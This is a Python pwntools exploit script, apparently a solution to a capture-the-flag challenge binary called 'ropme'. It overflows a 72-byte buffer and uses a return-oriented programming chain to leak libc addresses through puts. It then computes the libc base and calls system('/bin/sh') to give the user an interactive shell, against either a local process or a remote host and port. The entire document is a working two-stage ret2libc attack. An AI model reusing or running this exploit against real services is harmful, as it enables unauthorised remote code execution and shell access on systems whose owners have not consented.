from pwn import *
from sys import argv,exit

##### Janky command line parsing ##########
if len(sys.argv) < 2:
    print("usage: python ropper.py [local|remote ip port]")
    sys.exit(0)
    
elif sys.argv[1].lower() == 'remote':
    try:
        ip = sys.argv[2]
        port = int(sys.argv[3])
    except:
        print("Check your arguments")
        sys.exit(0)
        
    try:
        r = remote(ip,port)
    except:
        print("Check the provided ip and port")
        sys.exit(0)
    if sys.argv[2].lower() not in ('localhost','127.0.0.1'):
        REMOTE = True
        libc = ELF('/root/Desktop/libs/custom_downloaded/libc6_2.23-0ubuntu10_amd64/libc.so.6',False) # Not the right libc...but it has the correct offsets except /bin/sh
    else:
        REMOTE = False
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',False)
elif sys.argv[1].lower()=='local':
    REMOTE=False
    r = process('/root/Desktop/ropme')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',False)
else:
    print("usage: python ropper.py [remote|local]")
    sys.exit(0)
    
    
###### Make sure this 'solution' is empty when we append ###########
with open ('/root/Desktop/ropme_solution','w') as f:
    pass


def logger(pays):
    with open('ropme_solution','ab') as f:
        f.writelines(pays)

e = context.binary = ELF('./ropme')
print("\n\n")

pop_rdi_ret = 0x4006d3
puts_plt = e.plt.puts
puts_got = e.got.puts
flush_got = e.got.fflush
flush_plt = e.plt.fflush
maincall = e.symbols.main

bin_sh = 0x18cd17 # offset for actual libc - my remote libc is wrong by 0x40 for some reason


############ Leak addresses #############
payload =''
payload+='A'*72

####Leak Puts###
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)

###Leak Flush### (leaked 2 functions to help identify libc)
payload+=p64(pop_rdi_ret)
payload+=p64(flush_got)
payload+=p64(puts_plt)

########### Re-call main so we can trigger the vulnerability again #######
payload+=p64(maincall)


logger(payload+"\n") # Logging the first stage of the exploit


r.recvuntil('dah?') # Receive until input required
r.sendline(payload) # Send our payload
r.recvline() # Its gonna print out \n 
puts_leak = r.recvline().strip('\n')[::-1] # Receive printed puts address, remove \n and reverse it

flush_leak = r.recvline().strip('\n')[::-1]
base_lib = (int(enhex(puts_leak),16)-libc.symbols['puts'])

log.info("Flush: 0x" + enhex(flush_leak))
log.info("Puts: 0x" + enhex(puts_leak))
log.info("Difference: " + str(hex(int(enhex(puts_leak),16)-int(enhex(flush_leak),16))))
log.info("Calculated base libc: " + str(hex(base_lib)))

################# Fill buffer second time through ##############
payload = ''
payload+='A'*72

################# Setting up system('/bin/sh') ################

payload+=p64(pop_rdi_ret)
payload+=p64(base_lib+(bin_sh if REMOTE else libc.search('/bin/sh').next())) # base_lib + offset to /bin/sh gives a pointer to "/bin/sh"
payload+=p64(base_lib+libc.symbols['system']) # trigger system('/bin/sh')


################# Setting up exit(0) ##########################

payload+=p64(pop_rdi_ret)
payload+=p64(0)  # Just want a nice clean exit(0) when we leave the shell
payload+=p64(base_lib+libc.symbols['exit'])

logger(payload) # Keep the second part of our payload for future use

r.recvuntil('dah?')
r.sendline(payload) # Send it and let interactive() handling the printing
print("\n\n")
log.success("Welcome to your shell")
r.interactive() # Drop into shell